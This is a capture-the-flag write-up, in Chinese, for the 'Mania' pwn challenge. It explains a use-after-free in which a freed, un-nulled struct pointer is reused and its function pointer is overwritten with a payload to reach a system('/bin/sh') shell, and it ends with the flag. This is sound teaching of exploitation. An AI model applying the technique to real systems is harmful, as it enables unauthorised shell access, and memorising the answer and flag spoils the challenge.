# Mania

## 題目描述

Poor Joe has been doing binary exploitation challenges for too long and has gone mad. Can you help him re-adapt to society and have a real conversation?

```text
nc 0agn86asl3d2.boroctf.com 44996
```

## 解題思路

1. **第一步**：

    程式的兩個 struct 一樣大，而且有用到 free()，所以很可能是 UAF 漏洞。

    而且 PIE 沒開，所以可以直接利用函式位址。

    先看程式：

    ```c
    struct imaginaryFriend {
        double rating;              // 8 bytes
        char title[32];             // offset 8
        char special_ability[32];   // offset 40
    };

    struct realPerson {
        char firstName[32];         // offset 0
        char lastName[32];          // offset 32
        void (*conversate)();       // offset 64
    };
    ```

    可以看到程式 struct 大小都一樣，所以很可能會用一樣的 heap chunk。

    `realPerson` 裡有一個函式指標：

    ```c
    void (*conversate)();
    ```

    正常建立 real person 時，會被設成：

    ```c
    friend->conversate = realConversation;
    ```

    而互動時會直接呼叫：

    ```c
    RF->conversate();
    ```

    如果能覆蓋這個 function pointer，就能控制程式流程。

2. **第二步**：

    選單中的 `Ghost person` 會free(RF)：

    ```c
    case '4':
        free(RF);
        break;
    ```

    但它沒有把 RF 設回 NULL，所以 RF 還是指向原本的 heap chunk，變成 UAF 的狀況。

    接著如果再選 `Imagine friend`，因為 `imaginaryFriend` 和 `realPerson` 大小相同，malloc() 很可能會拿回剛剛被 free 的那塊 chunk。

    所以我們可以透過填寫 `imaginaryFriend` 的資料，覆蓋 dangling pointer `RF` 原本看到的 `realPerson` 內容。

3. **第三步**：

    realPerson的function pointer `conversate` 在 offset 64：

    ```text
    firstName[32] + lastName[32] = 64
    ```

    imaginaryFriend的 `special_ability` 在 offset 40：

    ```text
    rating[8] + title[32] = 40
    ```

    所以從 special_ability 開始，要覆蓋到 conversate，需要：

    ```text
    64 - 40 = 24 bytes
    ```

    payload：

    ```python
    b"A" * 24 + p64(idealConversation)
    ```

    這樣就能把 `RF->conversate` 改成 `idealConversation`。

4. **第四步**：

    用 nm 可以看到：

    ```bash
    nm -n chal | grep Conversation
    ```

    結果：

    ```text
    0000000000401717 T realConversation
    0000000000401731 T idealConversation
    ```

    所以目標位址是：

    ```python
    idealConversation = 0x401731
    ```

    `idealConversation()` 內容：

    ```c
    void idealConversation() {
        puts("Wow! You made a real connection!");
        system("/bin/sh");
    }
    ```

    所以只要拿到 `idealConversation()`，就可以拿到 shell。

5. **第五步**：

    根據上述步驟寫腳本，就可以拿到 flag。

## Flag

```text
boroCTF{tw0s_c0mpl3men+_M3}
```
